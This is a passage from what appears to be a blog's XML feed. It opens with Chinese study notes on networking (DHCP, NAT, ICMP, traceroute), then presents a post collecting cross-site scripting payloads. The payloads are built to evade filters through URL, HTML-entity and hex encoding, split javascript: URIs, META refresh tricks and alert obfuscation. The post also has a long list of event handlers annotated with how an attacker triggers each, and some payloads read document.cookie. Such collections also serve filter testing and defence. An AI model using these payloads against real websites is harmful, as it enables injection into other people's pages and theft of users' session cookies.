alt="4"></p><p>DHCP协议在应用层实现</p><ul><li>请求报文封装到UDP数据报中</li><li>IP广播</li><li>链路层广播（e.g.以太网广播）</li></ul><p><img src="/17/计算机网络学习笔记/5.png" alt="5"></p><p><img src="/17/计算机网络学习笔记/6.png" alt="6"></p><p>DHCP服务器构造ACK报文</p><ul><li>包括分配给客户的IP地址，子网掩码，默认网关，DNS服务器地址</li></ul><h3 id="网络地址转换（NAT）"><a href="#网络地址转换（NAT）" class="headerlink" title="网络地址转换（NAT）"></a>网络地址转换（NAT）</h3><p>动机：</p><ul><li>只需/能从ISP申请一个IP地址<ul><li>IPv4地址耗尽</li></ul></li><li>本地网络设备IP地址的变更，无需通告外界网络</li><li>变更ISP时，无需修改内部网络设备IP地址</li><li>内部网络设备对外界网络不可见，即不可直接寻址（安全）</li></ul><p>实现</p><ul><li>替换<ul><li>利用（NAT IP地址，新端口号）替换每个外出IP数据报的（源IP地址，源端口号）</li></ul></li><li>记录<ul><li>将每对（NAT IP地址，新端口号）与（源IP地址，源端口号）的替换信息存储到NAT转换表中</li></ul></li><li>替换<ul><li>根据NAT转换表，利用（源IP地址，源端口号）替换每个进入内网IP数据报的（目的IP地址，目的端口号），即（NAT IP地址，新端口号）</li></ul></li></ul><h3 id="NAT穿透问题"><a href="#NAT穿透问题" class="headerlink" title="NAT穿透问题"></a>NAT穿透问题</h3><p>解决方案1：静态配置NAT，将特定端口的连接请求转发给服务器</p><p>解决方法2：利用UPnP，互联网网关设备协议（IGD-Internet Gateway Device）自动配置</p><p>解决方案3：中继（skype）</p><ul><li>NAT内部的客户与中继服务器建立连接</li><li>外部客户也与中继服务器建立连接</li><li>中继服务器桥接两个连接的分组</li></ul><h3 id="互联网控制报文协议（ICMP）"><a href="#互联网控制报文协议（ICMP）" class="headerlink" title="互联网控制报文协议（ICMP）"></a>互联网控制报文协议（ICMP）</h3><p>ICMP支持主机或路由器：</p><ul><li>差错报告</li><li>网络探询</li></ul><p>两类ICMP报文：</p><ul><li>差错报告报文（5种）<ul><li>目的不可达</li><li>源抑制</li><li>超时/超期</li><li>参数问题</li><li>重定向</li></ul></li><li>网络探询报文（2组）<ul><li>回声（Echo）请求与应答报文</li><li>时间戳请求与应答报文</li></ul></li></ul><h4 id="例外情况"><a href="#例外情况" class="headerlink" title="例外情况"></a>例外情况</h4><p>几种不发送ICMP差错报告报文的特殊情况</p><ul><li>对ICMP差错报告报文不再发送ICMP差错报告报文</li><li>除第1个IP数据报分片外，对所有后续分片均不发送ICMP差错报告报文</li><li>对所有多播IP数据报均不发送ICMP差错报告报文</li><li>对具有特殊地址（如127.0.0.0或0.0.0.0）的IP数据报不发送ICMP差错报告报文</li></ul><p>几种ICMP报文已不再使用</p><ul><li>信息请求与应答报文</li><li>子网掩码请求与应答报文</li><li>路由器询问和通告报文</li></ul><h3 id="ICMP报文的格式"><a href="#ICMP报文的格式" class="headerlink" title="ICMP报文的格式"></a>ICMP报文的格式</h3><p><img src="/17/计算机网络学习笔记/7.png" alt="7"></p><h4 id="ICMP差错报告报文数据封装："><a href="#ICMP差错报告报文数据封装：" class="headerlink" title="ICMP差错报告报文数据封装："></a>ICMP差错报告报文数据封装：</h4><p><img src="/17/计算机网络学习笔记/8.png" alt="8"></p><h3 id="ICMP应用举例：Traceroute"><a href="#ICMP应用举例：Traceroute" class="headerlink" title="ICMP应用举例：Traceroute"></a>ICMP应用举例：Traceroute</h3><p>源主机向目的主机发送一些列UDP数据报</p><ul><li>第1组IP数据报TTL=1</li><li>第2组IP数据报TTL=2，etc</li><li>目的端口号为不可能使用端口号</li></ul><p>当第n组数据报（TTL=n）到达第n个路由器时：</p><ul><li>路由器丢弃数据报</li><li>向源主机发送ICMP报文（type=11，code=0）</li><li>ICMP报文携带路由器名称和IP地址信息</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;四种分组延迟&quot;&gt;&lt;a href=&quot;#四种分组延迟&quot; class=&quot;headerlink&quot; title=&quot;四种分组延迟&quot;&gt;&lt;/a&gt;四种分组延迟&lt;/h3&gt;&lt;p&gt;结点处理延迟&lt;/p&gt;
&lt;p&gt;排队延迟&lt;/p&gt;
&lt;p&gt;传输延迟&lt;/p&gt;
&lt;p&gt;传播延迟&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>xss payload收集</title>
    <link href="elssm.github.io/2018/06/27/xss-payload%E6%94%B6%E9%9B%86/"/>
    <id>elssm.github.io/2018/06/27/xss-payload收集/</id>
    <published>2018-06-27T13:42:21.000Z</published>
    <updated>2018-07-03T13:49:32.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="使用URL编码器对整个代码进行编码"><a href="#使用URL编码器对整个代码进行编码" class="headerlink" title="-使用URL编码器对整个代码进行编码"></a>-使用URL编码器对整个代码进行编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';alert(String.fromCharCode(88,83,83))//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">";alert(String.fromCharCode(88,83,83))//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--&gt;&lt;/SCRIPT&gt;"&gt;'</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="较短的xss定位器"><a href="#较短的xss定位器" class="headerlink" title="-较短的xss定位器"></a>-较短的xss定位器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";!--"</span>&lt;XSS&gt;=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure><h3 id="利用多语言进行过滤绕过"><a href="#利用多语言进行过滤绕过" class="headerlink" title="-利用多语言进行过滤绕过"></a>-利用多语言进行过滤绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img/id="confirm&amp;lpar;1)"/alt="/"src="/"onerror=eval(id)&gt;'</span><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="HTML实体"><a href="#HTML实体" class="headerlink" title="-HTML实体"></a>-HTML实体</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br></pre></td></tr></table></figure><h3 id="重音符混淆"><a href="#重音符混淆" class="headerlink" title="-重音符混淆"></a>-重音符混淆</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">`javascript:alert("xss")`</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="A标签"><a href="#A标签" class="headerlink" title="-A标签"></a>-A标签</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a onmouseover=<span class="string">"alert(document.cookie)"</span>&gt;xss link&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;a onmouseover=alert(document.cookie)&gt;xss link&lt;/</span>a&gt;</span><br></pre></td></tr></table></figure><h3 id="IMG标签"><a href="#IMG标签" class="headerlink" title="-IMG标签"></a>-IMG标签</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG <span class="string">""</span><span class="string">"&gt;&lt;SCRIPT&gt;alert("</span>xss<span class="string">")&lt;/SCRIPT&gt;"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="string">"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#000011</span></span><br><span class="line"><span class="string">5&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000</span></span><br><span class="line"><span class="string">097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#00</span></span><br><span class="line"><span class="string">00088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#11</span><br><span class="line">6;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40; </span><br><span class="line">&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#00000</span><br><span class="line">99&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp; </span><br><span class="line">#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088</span><br><span class="line">&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74</span><br><span class="line">&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27</span><br><span class="line">&amp;#x29&gt;</span><br></pre></td></tr></table></figure><h3 id="内嵌TAB"><a href="#内嵌TAB" class="headerlink" title="-内嵌TAB"></a>-内嵌TAB</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">"jav ascript:alert('XSS');"</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="内嵌换行分割"><a href="#内嵌换行分割" class="headerlink" title="-内嵌换行分割"></a>-内嵌换行分割</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">"jav&amp;#x0A;ascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="内嵌回车"><a href="#内嵌回车" class="headerlink" title="-内嵌回车"></a>-内嵌回车</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="JavaScript双重转义"><a href="#JavaScript双重转义" class="headerlink" title="-JavaScript双重转义"></a>-JavaScript双重转义</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">";alert('XSS');//</span></span><br></pre></td></tr></table></figure><h3 id="ECMAScript-6"><a href="#ECMAScript-6" class="headerlink" title="-ECMAScript 6"></a>-ECMAScript 6</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>.constructor<span class="string">`alert\x28document.domain\29`</span></span><br></pre></td></tr></table></figure><h3 id="事件处理程序"><a href="#事件处理程序" class="headerlink" title="-事件处理程序"></a>-事件处理程序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件) </span><br><span class="line"><span class="number">2.</span> onAbort() (当用户中止加载图片时) </span><br><span class="line"><span class="number">3.</span> onActivate() (当对象激活时) </span><br><span class="line"><span class="number">4.</span> onAfterPrint() (用户打印或进行打印预览后触发) </span><br><span class="line"><span class="number">5.</span> onAfterUpdate() (从数据源对象更新数据后由数据对象触发) </span><br><span class="line"><span class="number">6.</span> onBeforeActivate() (在对象设置为激活元素前触发) </span><br><span class="line"><span class="number">7.</span> onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过</span><br><span class="line">执行execCommand(<span class="string">"Copy"</span>)函数触发) </span><br><span class="line"><span class="number">8.</span> onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码) </span><br><span class="line"><span class="number">9.</span> onBeforeDeactivate() (在当前对象的激活元素变化前触发) </span><br><span class="line"><span class="number">10.</span> onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的</span><br><span class="line">对象被选中时触发) </span><br><span class="line"><span class="number">11.</span> onBeforePaste() (在用户被诱导进行粘贴前或使用 execCommand(<span class="string">"Paste"</span>)函数触</span><br><span class="line">发) </span><br><span class="line"><span class="number">12.</span> onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用 print()或 execComma</span><br><span class="line">nd(<span class="string">"Print"</span>)函数). </span><br><span class="line"><span class="number">13.</span> onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能</span><br><span class="line">关闭当前窗口) </span><br><span class="line"><span class="number">14.</span> onBeforeUpdate() (从数据源对象更新数据前由数据对象触发) </span><br><span class="line"><span class="number">15.</span> onBegin() (当元素周期开始时由onbegin 事件立即触发) </span><br><span class="line"><span class="number">16.</span> onBlur() (另一个窗口弹出当前窗口失去焦点时触发) </span><br><span class="line"><span class="number">17.</span> onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内</span><br><span class="line">容到达窗口一边时触发) </span><br><span class="line"><span class="number">18.</span> onCellChange() (当数据提供者的数据变化时触发) </span><br><span class="line"><span class="number">19.</span> onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发) </span><br><span class="line"><span class="number">20.</span> onClick() (表单中点击触发) </span><br><span class="line"><span class="number">21.</span> onContextMenu() (用户需要在攻击区域点击右键) </span><br><span class="line"><span class="number">22.</span> onControlSelect() (当用户在一个对象上创建控件选中区时触发) </span><br><span class="line"><span class="number">23.</span> onCopy() (用户需要复制一些东西或使用execCommand(<span class="string">"Copy"</span>)命令时触发) </span><br><span class="line"><span class="number">24.</span> onCut() (用户需要剪切一些东西或使用execCommand(<span class="string">"Cut"</span>)命令时触发) </span><br><span class="line"><span class="number">25.</span> onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能) </span><br><span class="line"><span class="number">26.</span> onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发) </span><br><span class="line"><span class="number">27.</span> onDataSetComplete() (数据源对象中所有数据可用时触发) </span><br><span class="line"><span class="number">28.</span> onDblClick() (用户双击一个表单元素或链接) </span><br><span class="line"><span class="number">29.</span> onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发) </span><br><span class="line"><span class="number">30.</span> onDrag() (在元素正在拖动时触发) </span><br><span class="line"><span class="number">31.</span> onDragEnd() (当用户完成元素的拖动时触发) </span><br><span class="line"><span class="number">32.</span> onDragLeave() (用户在拖动元素离开放置目标时触发) </span><br><span class="line"><span class="number">33.</span> onDragEnter() (用户将对象拖拽到合法拖曳目标) </span><br><span class="line"><span class="number">34.</span> onDragOver() (用户将对象拖拽划过合法拖曳目标) </span><br><span class="line"><span class="number">35.</span> onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口) </span><br><span class="line"><span class="number">36.</span> onDragStart() (当用户开始拖动元素时触发) </span><br><span class="line"><span class="number">37.</span> onDrop() (当拖动元素放置在目标区域时触发) </span><br><span class="line"><span class="number">38.</span> onEnded() (在视频/音频（audio/video）播放结束时触发) </span><br><span class="line"><span class="number">39.</span> onError() (在加载文档或图像时发生错误) </span><br><span class="line"><span class="number">40.</span> onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发) </span><br><span class="line"><span class="number">41.</span> onFilterChange() (当滤镜完成状态变更时触发) </span><br><span class="line"><span class="number">42.</span> onFinish() (当marquee完成滚动时攻击者可以执行攻击) </span><br><span class="line"><span class="number">43.</span> onFocus() (当窗口获得焦点时攻击者可以执行攻击代码) </span><br><span class="line"><span class="number">44.</span> onFocusIn() (当元素将要被设置为焦点之前触发) </span><br><span class="line"><span class="number">45.</span> onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码) </span><br><span class="line"><span class="number">46.</span> onHashChange() (当锚部分发生变化时触发攻击代码) </span><br><span class="line"><span class="number">47.</span> onHelp() (攻击者可以在用户在当前窗体激活时按下F1 触发攻击代码) </span><br><span class="line"><span class="number">48.</span> onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发) </span><br><span class="line"><span class="number">49.</span> onKeyDown() (用户按下一个键的时候触发) </span><br><span class="line"><span class="number">50.</span> onKeyPress() (在键盘按键被按下并释放一个键时触发) </span><br><span class="line"><span class="number">51.</span> onKeyUp() (用户释放一个键时触发) </span><br><span class="line"><span class="number">52.</span> onLayoutComplete() (用户进行完打印或打印预览时触发) </span><br><span class="line"><span class="number">53.</span> onLoad() (攻击者在窗口加载后触发攻击代码) </span><br><span class="line"><span class="number">54.</span> onLoseCapture() (可以由releaseCapture()方法触发) </span><br><span class="line"><span class="number">55.</span> onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发) </span><br><span class="line"><span class="number">56.</span> onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发</span><br><span class="line">事件) </span><br><span class="line"><span class="number">57.</span> onMessage() (当页面收到一个信息时触发事件) </span><br><span class="line"><span class="number">58.</span> onMouseDown() (攻击者需要让用户点击一个图片触发事件) </span><br><span class="line"><span class="number">59.</span> onMouseEnter() (光标移动到一个对象或区域时触发) </span><br><span class="line"><span class="number">60.</span> onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事</span><br><span class="line">件) </span><br><span class="line"><span class="number">61.</span> onMouseMove() (攻击者需要让用户将光标移到一个图片或表格) </span><br><span class="line"><span class="number">62.</span> onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件) </span><br><span class="line"><span class="number">63.</span> onMouseOver() (光标移动到一个对象或区域) </span><br><span class="line"><span class="number">64.</span> onMouseUp() (攻击者需要让用户点击一个图片) </span><br><span class="line"><span class="number">65.</span> onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮) </span><br><span class="line"><span class="number">66.</span> onMove() (用户或攻击者移动页面时触发) </span><br><span class="line"><span class="number">67.</span> onMoveEnd() (用户或攻击者移动页面结束时触发) </span><br><span class="line"><span class="number">68.</span> onMoveStart() (用户或攻击者开始移动页面时触发) </span><br><span class="line"><span class="number">69.</span> onOffline() (当浏览器从在线模式切换到离线模式时触发) </span><br><span class="line"><span class="number">70.</span> onOnline() (当浏览器从离线模式切换到在线模式时触发) </span><br><span class="line"><span class="number">71.</span> onOutOfSync() (当元素与当前时间线失去同步时触发) </span><br><span class="line"><span class="number">72.</span> onPaste() (用户进行粘贴时或攻击者可以使用execCommand(<span class="string">"Paste"</span>)函数时触发) </span><br><span class="line"><span class="number">73.</span> onPause() (在视频或音频暂停时触发) </span><br><span class="line"><span class="number">74.</span> onPopState() (在窗口的浏览历史（history 对象）发生改变时触发) </span><br><span class="line"><span class="number">75.</span> onProgress() (攻击者可以在一个FLASH加载时触发事件) </span><br><span class="line"><span class="number">76.</span> onPropertyChange() (用户或攻击者需要改变元素属性时触发) </span><br><span class="line"><span class="number">77.</span> onReadyStateChange() (每次 readyState 属性变化时被自动调用) </span><br><span class="line"><span class="number">78.</span> onRedo() (用户返回上一页面时触发) </span><br><span class="line"><span class="number">79.</span> onRepeat() (事件在播放完重复播放时触发) </span><br><span class="line"><span class="number">80.</span> onReset() (用户或攻击者重置表单时触发) </span><br><span class="line"><span class="number">81.</span> onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发: <span class="xml"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>self.resizeTo(500,400);<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span>) </span><br><span class="line"><span class="number">82.</span> onResizeEnd() (用户完成改变窗体大小时触发) </span><br><span class="line"><span class="number">83.</span> onResizeStart() (用户开始改变窗体大小时触发) </span><br><span class="line"><span class="number">84.</span> onResume() (当元素继续播放时触发) </span><br><span class="line"><span class="number">85.</span> onReverse() (当元素回放时触发) </span><br><span class="line"><span class="number">86.</span> onRowsEnter() (用户或攻击者需要改变数据源中的一行) </span><br><span class="line"><span class="number">87.</span> onRowExit() (用户或攻击者改变数据源中的一行后退出时触发) </span><br><span class="line"><span class="number">88.</span> onRowDelete() (用户或攻击者需要删除数据源中的一行) </span><br><span class="line"><span class="number">89.</span> onRowInserted() (user or attacker would need to insert a row <span class="keyword">in</span> a data source) </span><br><span class="line"><span class="number">90.</span> onScroll() (用户需要滚动或攻击者使用scrollBy()函数) </span><br><span class="line"><span class="number">91.</span> onSeek() (当用户在元素上执行查找操作时触发) </span><br><span class="line"><span class="number">92.</span> onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: <span class="built_in">window</span>.document.execCommand(<span class="string">"SelectAll"</span>);) </span><br><span class="line"><span class="number">93.</span> onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: <span class="built_in">window</span>.document.execCommand(<span class="string">"SelectAll"</span>);) </span><br><span class="line"><span class="number">94.</span> onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: <span class="built_in">window</span>.document.execCommand(<span class="string">"SelectAll"</span>);) </span><br><span class="line"><span class="number">95.</span> onStart() (在marquee 对象开始循环时触发) </span><br><span class="line"><span class="number">96.</span> onStop() (当用户按下停止按钮或离开页面时触发) </span><br><span class="line"><span class="number">97.</span> onStorage() (当Web Storage更新时触发) </span><br><span class="line"><span class="number">98.</span> onSyncRestored() (当元素与它的时间线恢复同步时触发) </span><br><span class="line"><span class="number">99.</span> onSubmit() (需要用户或攻击者提交表单) </span><br><span class="line"><span class="number">100.</span>onTimeError() (用户或攻击者设置时间属性出现错误时触发) </span><br><span class="line"><span class="number">101.</span>onTrackChange() (用户或攻击者改变播放列表内歌曲时触发) </span><br><span class="line"><span class="number">102.</span>onUndo() (用户返回上一浏览记录页面时触发) </span><br><span class="line"><span class="number">103.</span>onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发) </span><br><span class="line"><span class="number">104.</span>onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个 HTML+TIME（基于时间</span><br><span class="line">交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本) </span><br><span class="line"><span class="number">105.</span>seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可</span><br><span class="line">以从该点播放。这个段落包含了一个重复的时间线，并包括使用 AUTOREVERSE 属性</span><br><span class="line">进行反向播放。)</span><br></pre></td></tr></table></figure><h3 id="含有分隔JavaScript的STYLE标签"><a href="#含有分隔JavaScript的STYLE标签" class="headerlink" title="-含有分隔JavaScript的STYLE标签"></a>-含有分隔JavaScript的STYLE标签</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;@im\port<span class="string">'\ja\vasc\ript:alert("XSS")'</span>;&lt;<span class="regexp">/STYLE&gt;</span></span><br></pre></td></tr></table></figure><h3 id="META"><a href="#META" class="headerlink" title="-META"></a>-META</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0;url=data:text/html base64,PHNjc</span></span><br><span class="line"><span class="string">mlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0; URL=http://;URL=javascript:alert</span></span><br><span class="line"><span class="string">('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="Alert混淆以绕过过滤器"><a href="#Alert混淆以绕过过滤器" class="headerlink" title="Alert混淆以绕过过滤器"></a>Alert混淆以绕过过滤器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(alert)(<span class="number">1</span>) </span><br><span class="line">a=alert,a(<span class="number">1</span>) </span><br><span class="line">[<span class="number">1</span>].find(alert) </span><br><span class="line">top[“al”+”ert”](<span class="number">1</span>) </span><br><span class="line">top[<span class="regexp">/al/</span>.source+<span class="regexp">/ert/</span>.source](<span class="number">1</span>) </span><br><span class="line">al\u0065rt(<span class="number">1</span>) </span><br><span class="line">top[‘al\<span class="number">145</span>rt’](<span class="number">1</span>) </span><br><span class="line">top[‘al\x65rt’](<span class="number">1</span>) </span><br><span class="line">top[<span class="number">8680439.</span>.toString(<span class="number">30</span>)](<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="字符转义表"><a href="#字符转义表" 